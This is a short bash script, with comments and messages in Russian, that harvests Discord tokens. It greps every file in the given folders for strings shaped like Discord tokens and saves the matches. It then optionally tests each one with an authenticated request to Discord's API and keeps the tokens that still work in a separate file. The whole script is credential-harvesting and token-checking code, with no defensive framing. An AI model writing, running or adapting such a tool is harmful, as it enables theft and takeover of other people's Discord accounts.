#!/bin/bash

# Проверка аргументов
if [ $# -lt 2 ]; then
  echo "Использование: $0 <validate> <out_path> <folder1> ..."
  exit 1
fi

validate=$1
out_path=$2
shift 2
folders=$@

# Функция поиска токенов
function find_tokens() {

  for folder in $1; do
    for file in $folder/*; do
      if [ -f "$file" ]; then
        grep -Eoh "NT[0-9]{10}\.[0-9A-Z]{24}\.[0-9a-zA-Z-_]{6}" "$file" >> "$tokens_file"
      fi
    done
  done

}

# Функция проверки токенов
function validate_tokens() {

  while read token; do
    response=$(curl -s -H "Authorization: Bot $token" https://discord.com/api/v6/invite/random-code)
    echo $response
    if [[ "$response" =~ "401: Unauthorized" ]]; then
      echo "Токен $token невалиден"

    elif [[ "$response" =~ "You need to verify your account" ]]; then
      echo "Токен $token требует подтверждения телефона"

    else
      echo "Токен $token валиден"
      echo "$token" >> "$valid_tokens_file"
    fi

  done < "$tokens_file"

}

# Логика

tokens_file="$out_path/tokens.txt"
valid_tokens_file="$out_path/valid_tokens.txt"

find_tokens "$folders"

if [ "$validate" = "1" ]; then
  validate_tokens
fi

echo "Готово"
